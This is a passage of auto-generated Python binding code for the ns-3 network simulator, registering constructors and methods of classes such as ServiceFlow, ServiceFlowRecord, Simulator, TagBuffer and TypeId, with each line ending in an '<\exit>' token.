cls.add_method('ResetInvitedRangingRetries',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('ResetRangingCorrectionRetries',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('SetAreServiceFlowsAllocated',<\exit>
'void',<\exit>
[param('bool', 'val')])<\exit>
cls.add_method('SetBasicCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'basicCid')])<\exit>
cls.add_method('SetDsaRsp',<\exit>
'void',<\exit>
[param('ns3::DsaRsp', 'dsaRsp')])<\exit>
cls.add_method('SetDsaRspRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'dsaRspRetries')])<\exit>
cls.add_method('SetIPAddress',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address', 'IPaddress')])<\exit>
cls.add_method('SetIsBroadcastSS',<\exit>
'void',<\exit>
[param('bool', 'arg0')])<\exit>
cls.add_method('SetMacAddress',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'macAddress')])<\exit>
cls.add_method('SetModulationType',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('SetPollMeBit',<\exit>
'void',<\exit>
[param('bool', 'pollMeBit')])<\exit>
cls.add_method('SetPrimaryCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'primaryCid')])<\exit>
cls.add_method('SetRangingStatus',<\exit>
'void',<\exit>
[param('ns3::WimaxNetDevice::RangingStatus', 'rangingStatus')])<\exit>
cls.add_method('SetSfTransactionId',<\exit>
'void',<\exit>
[param('uint16_t', 'sfTransactionId')])<\exit>
return<\exit>
def register_Ns3SeedManager_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SeedManager const &', 'arg0')])<\exit>
cls.add_method('CheckSeed',<\exit>
'bool',<\exit>
[param('uint32_t', 'seed')],<\exit>
is_static=True)<\exit>
cls.add_method('GetRun',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSeed',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('SetRun',<\exit>
'void',<\exit>
[param('uint32_t', 'run')],<\exit>
is_static=True)<\exit>
cls.add_method('SetSeed',<\exit>
'void',<\exit>
[param('uint32_t', 'seed')],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3SendParams_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SendParams const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
return<\exit>
def register_Ns3SequentialVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SequentialVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('double', 'f'), param('double', 'l'), param('double', 'i', default_value='1'), param('uint32_t', 'c', default_value='1')])<\exit>
cls.add_constructor([param('double', 'f'), param('double', 'l'), param('ns3::RandomVariable const &', 'i'), param('uint32_t', 'c', default_value='1')])<\exit>
return<\exit>
def register_Ns3ServiceFlow_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Tlv', 'tlv')])<\exit>
cls.add_constructor([param('ns3::ServiceFlow::Direction', 'direction')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ServiceFlow const &', 'sf')])<\exit>
cls.add_constructor([param('uint32_t', 'sfid'), param('ns3::ServiceFlow::Direction', 'direction'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')])<\exit>
cls.add_method('CheckClassifierMatch',<\exit>
'bool',<\exit>
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Address', 'dstAddress'), param('uint16_t', 'srcPort'), param('uint16_t', 'dstPort'), param('uint8_t', 'proto')],<\exit>
is_const=True)<\exit>
cls.add_method('CleanUpQueue',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('CopyParametersFrom',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('GetArqBlockLifeTime',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqBlockSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqDeliverInOrder',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqEnable',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqPurgeTimeout',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqRetryTimeoutRx',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqRetryTimeoutTx',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqSyncLoss',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetArqWindowSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCid',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConvergenceSublayerParam',<\exit>
'ns3::CsParameters',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCsSpecification',<\exit>
'ns3::ServiceFlow::CsSpecification',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDirection',<\exit>
'ns3::ServiceFlow::Direction',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFixedversusVariableSduIndicator',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIsEnabled',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetIsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMaxSustainedTrafficRate',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMaxTrafficBurst',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMaximumLatency',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMinReservedTrafficRate',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMinTolerableTrafficRate',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetModulation',<\exit>
'ns3::WimaxPhy::ModulationType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetQosParamSetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetQueue',<\exit>
'ns3::Ptr< ns3::WimaxMacQueue >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRecord',<\exit>
'ns3::ServiceFlowRecord *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRequestTransmissionPolicy',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSchedulingType',<\exit>
'ns3::ServiceFlow::SchedulingType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSchedulingTypeStr',<\exit>
'char *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSduSize',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceClassName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceSchedulingType',<\exit>
'ns3::ServiceFlow::SchedulingType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSfid',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTargetSAID',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetToleratedJitter',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTrafficPriority',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'ns3::ServiceFlow::Type',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUnsolicitedGrantInterval',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUnsolicitedPollingInterval',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')],<\exit>
is_const=True)<\exit>
cls.add_method('InitValues',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('PrintQoSParameters',<\exit>
'void',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetArqBlockLifeTime',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqBlockSize',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqDeliverInOrder',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetArqEnable',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetArqPurgeTimeout',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqRetryTimeoutRx',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqRetryTimeoutTx',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqSyncLoss',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetArqWindowSize',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection')])<\exit>
cls.add_method('SetConvergenceSublayerParam',<\exit>
'void',<\exit>
[param('ns3::CsParameters', 'arg0')])<\exit>
cls.add_method('SetCsSpecification',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow::CsSpecification', 'arg0')])<\exit>
cls.add_method('SetDirection',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow::Direction', 'direction')])<\exit>
cls.add_method('SetFixedversusVariableSduIndicator',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetIsEnabled',<\exit>
'void',<\exit>
[param('bool', 'isEnabled')])<\exit>
cls.add_method('SetIsMulticast',<\exit>
'void',<\exit>
[param('bool', 'isMulticast')])<\exit>
cls.add_method('SetMaxSustainedTrafficRate',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetMaxTrafficBurst',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetMaximumLatency',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetMinReservedTrafficRate',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetMinTolerableTrafficRate',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetModulation',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('SetQosParamSetType',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetRecord',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'record')])<\exit>
cls.add_method('SetRequestTransmissionPolicy',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetSduSize',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetServiceClassName',<\exit>
'void',<\exit>
[param('std::string', 'arg0')])<\exit>
cls.add_method('SetServiceSchedulingType',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow::SchedulingType', 'arg0')])<\exit>
cls.add_method('SetSfid',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetTargetSAID',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetToleratedJitter',<\exit>
'void',<\exit>
[param('uint32_t', 'arg0')])<\exit>
cls.add_method('SetTrafficPriority',<\exit>
'void',<\exit>
[param('uint8_t', 'arg0')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow::Type', 'type')])<\exit>
cls.add_method('SetUnsolicitedGrantInterval',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('SetUnsolicitedPollingInterval',<\exit>
'void',<\exit>
[param('uint16_t', 'arg0')])<\exit>
cls.add_method('ToTlv',<\exit>
'ns3::Tlv',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ServiceFlowRecord_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ServiceFlowRecord const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetBacklogged',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBackloggedTemp',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBwSinceLastExpiry',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetBytesRcvd',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBytesSent',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlTimeStamp',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGrantSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGrantTimeStamp',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGrantedBandwidth',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetGrantedBandwidthTemp',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetLastGrantTime',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPktsRcvd',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPktsSent',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRequestedBandwidth',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('IncreaseBacklogged',<\exit>
'void',<\exit>
[param('uint32_t', 'backlogged')])<\exit>
cls.add_method('IncreaseBackloggedTemp',<\exit>
'void',<\exit>
[param('uint32_t', 'backloggedTemp')])<\exit>
cls.add_method('SetBacklogged',<\exit>
'void',<\exit>
[param('uint32_t', 'backlogged')])<\exit>
cls.add_method('SetBackloggedTemp',<\exit>
'void',<\exit>
[param('uint32_t', 'backloggedTemp')])<\exit>
cls.add_method('SetBwSinceLastExpiry',<\exit>
'void',<\exit>
[param('uint32_t', 'bwSinceLastExpiry')])<\exit>
cls.add_method('SetBytesRcvd',<\exit>
'void',<\exit>
[param('uint32_t', 'bytesRcvd')])<\exit>
cls.add_method('SetBytesSent',<\exit>
'void',<\exit>
[param('uint32_t', 'bytesSent')])<\exit>
cls.add_method('SetDlTimeStamp',<\exit>
'void',<\exit>
[param('ns3::Time', 'dlTimeStamp')])<\exit>
cls.add_method('SetGrantSize',<\exit>
'void',<\exit>
[param('uint32_t', 'grantSize')])<\exit>
cls.add_method('SetGrantTimeStamp',<\exit>
'void',<\exit>
[param('ns3::Time', 'grantTimeStamp')])<\exit>
cls.add_method('SetGrantedBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'grantedBandwidth')])<\exit>
cls.add_method('SetGrantedBandwidthTemp',<\exit>
'void',<\exit>
[param('uint32_t', 'grantedBandwidthTemp')])<\exit>
cls.add_method('SetLastGrantTime',<\exit>
'void',<\exit>
[param('ns3::Time', 'grantTime')])<\exit>
cls.add_method('SetPktsRcvd',<\exit>
'void',<\exit>
[param('uint32_t', 'pktsRcvd')])<\exit>
cls.add_method('SetPktsSent',<\exit>
'void',<\exit>
[param('uint32_t', 'pktsSent')])<\exit>
cls.add_method('SetRequestedBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'requestedBandwidth')])<\exit>
cls.add_method('UpdateBwSinceLastExpiry',<\exit>
'void',<\exit>
[param('uint32_t', 'bwSinceLastExpiry')])<\exit>
cls.add_method('UpdateBytesRcvd',<\exit>
'void',<\exit>
[param('uint32_t', 'bytesRcvd')])<\exit>
cls.add_method('UpdateBytesSent',<\exit>
'void',<\exit>
[param('uint32_t', 'bytesSent')])<\exit>
cls.add_method('UpdateGrantedBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'grantedBandwidth')])<\exit>
cls.add_method('UpdateGrantedBandwidthTemp',<\exit>
'void',<\exit>
[param('uint32_t', 'grantedBandwidthTemp')])<\exit>
cls.add_method('UpdatePktsRcvd',<\exit>
'void',<\exit>
[param('uint32_t', 'pktsRcvd')])<\exit>
cls.add_method('UpdatePktsSent',<\exit>
'void',<\exit>
[param('uint32_t', 'pktsSent')])<\exit>
cls.add_method('UpdateRequestedBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'requestedBandwidth')])<\exit>
return<\exit>
def register_Ns3SimpleRefCount__Ns3Object_Ns3ObjectBase_Ns3ObjectDeleter_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter > const &', 'o')])<\exit>
cls.add_method('Cleanup',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3Simulator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Simulator const &', 'arg0')])<\exit>
cls.add_method('Cancel',<\exit>
'void',<\exit>
[param('ns3::EventId const &', 'id')],<\exit>
is_static=True)<\exit>
cls.add_method('Destroy',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetContext',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetDelayLeft',<\exit>
'ns3::Time',<\exit>
[param('ns3::EventId const &', 'id')],<\exit>
is_static=True)<\exit>
cls.add_method('GetImplementation',<\exit>
'ns3::Ptr< ns3::SimulatorImpl >',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetMaximumSimulationTime',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetSystemId',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsExpired',<\exit>
'bool',<\exit>
[param('ns3::EventId const &', 'id')],<\exit>
is_static=True)<\exit>
cls.add_method('IsFinished',<\exit>
'bool',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_static=True, deprecated=True)<\exit>
cls.add_method('Now',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Remove',<\exit>
'void',<\exit>
[param('ns3::EventId const &', 'id')],<\exit>
is_static=True)<\exit>
cls.add_method('RunOneEvent',<\exit>
'void',<\exit>
[],<\exit>
is_static=True, deprecated=True)<\exit>
cls.add_method('SetImplementation',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SimulatorImpl >', 'impl')],<\exit>
is_static=True)<\exit>
cls.add_method('SetScheduler',<\exit>
'void',<\exit>
[param('ns3::ObjectFactory', 'schedulerFactory')],<\exit>
is_static=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[param('ns3::Time const &', 'time')],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3Tag_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Tag const &', 'arg0')])<\exit>
cls.add_method('Deserialize',<\exit>
'void',<\exit>
[param('ns3::TagBuffer', 'i')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::TagBuffer', 'i')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TagBuffer_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::TagBuffer const &', 'arg0')])<\exit>
cls.add_constructor([param('uint8_t *', 'start'), param('uint8_t *', 'end')])<\exit>
cls.add_method('CopyFrom',<\exit>
'void',<\exit>
[param('ns3::TagBuffer', 'o')])<\exit>
cls.add_method('Read',<\exit>
'void',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('ReadDouble',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('ReadU16',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('ReadU32',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('ReadU64',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('ReadU8',<\exit>
'uint8_t',<\exit>
[])<\exit>
cls.add_method('TrimAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'trim')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('WriteDouble',<\exit>
'void',<\exit>
[param('double', 'v')])<\exit>
cls.add_method('WriteU16',<\exit>
'void',<\exit>
[param('uint16_t', 'data')])<\exit>
cls.add_method('WriteU32',<\exit>
'void',<\exit>
[param('uint32_t', 'data')])<\exit>
cls.add_method('WriteU64',<\exit>
'void',<\exit>
[param('uint64_t', 'v')])<\exit>
cls.add_method('WriteU8',<\exit>
'void',<\exit>
[param('uint8_t', 'v')])<\exit>
return<\exit>
def register_Ns3TlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TlvValue const &', 'arg0')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::TlvValue *',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TosTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::TosTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t', 'arg0'), param('uint8_t', 'arg1'), param('uint8_t', 'arg2')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::TosTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetHigh',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLow',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMask',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3TriangularVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::TriangularVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 's'), param('double', 'l'), param('double', 'mean')])<\exit>
return<\exit>
def register_Ns3TypeId_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_constructor([param('char const *', 'name')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeId const &', 'o')])<\exit>
cls.add_method('AddAttribute',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'name'), param('std::string', 'help'), param('ns3::AttributeValue const &', 'initialValue'), param('ns3::Ptr< ns3::AttributeAccessor const >', 'accessor'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')])<\exit>
cls.add_method('AddAttribute',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'name'), param('std::string', 'help'), param('uint32_t', 'flags'), param('ns3::AttributeValue const &', 'initialValue'), param('ns3::Ptr< ns3::AttributeAccessor const >', 'accessor'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')])<\exit>
cls.add_method('AddTraceSource',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'name'), param('std::string', 'help'), param('ns3::Ptr< ns3::TraceSourceAccessor const >', 'accessor')])<\exit>
cls.add_method('GetAttribute',<\exit>
'ns3::TypeId::AttributeInformation',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetAttributeFullName',<\exit>
'std::string',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetAttributeN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConstructor',<\exit>
'ns3::Callback< ns3::ObjectBase *, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGroupName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetParent',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRegistered',<\exit>
'ns3::TypeId',<\exit>
[param('uint32_t', 'i')],<\exit>
is_static=True)<\exit>
cls.add_method('GetRegisteredN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetTraceSource',<\exit>
'ns3::TypeId::TraceSourceInformation',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTraceSourceN',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUid',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasConstructor',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasParent',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HideFromDocumentation',<\exit>
'ns3::TypeId',<\exit>
[])<\exit>
cls.add_method('IsChildOf',<\exit>
'bool',<\exit>
[param('ns3::TypeId', 'other')],<\exit>
is_const=True)<\exit>
cls.add_method('LookupAttributeByName',<\exit>
'bool',<\exit>
[param('std::string', 'name'), param('ns3::TypeId::AttributeInformation *', 'info')],<\exit>
is_const=True)<\exit>
cls.add_method('LookupByName',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'name')],<\exit>
is_static=True)<\exit>
cls.add_method('LookupTraceSourceByName',<\exit>
'ns3::Ptr< ns3::TraceSourceAccessor const >',<\exit>
[param('std::string', 'name')],<\exit>
is_const=True)<\exit>
cls.add_method('MustHideFromDocumentation',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetAttributeInitialValue',<\exit>
'bool',<\exit>
[param('uint32_t', 'i'), param('ns3::Ptr< ns3::AttributeValue const >', 'initialValue')])<\exit>
cls.add_method('SetGroupName',<\exit>
'ns3::TypeId',<\exit>
[param('std::string', 'groupName')])<\exit>
cls.add_method('SetParent',<\exit>
'ns3::TypeId',<\exit>
[param('ns3::TypeId', 'tid')])<\exit>
cls.add_method('SetUid',<\exit>
'void',<\exit>
[param('uint16_t', 'tid')])<\exit>
return<\exit>
def register_Ns3TypeIdAttributeInformation_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeId::AttributeInformation const &', 'arg0')])<\exit>
cls.add_instance_attribute('accessor', 'ns3::Ptr< ns3::AttributeAccessor const >', is_const=False)<\exit>
cls.add_instance_attribute('checker', 'ns3::Ptr< ns3::AttributeChecker const >', is_const=False)<\exit>
cls.add_instance_attribute('flags', 'uint32_t', is_const=False)<\exit>
cls.add_instance_attribute('help', 'std::string', is_const=False)<\exit>
cls.add_instance_attribute('initialValue', 'ns3::Ptr< ns3::AttributeValue const >', is_const=False)<\exit>
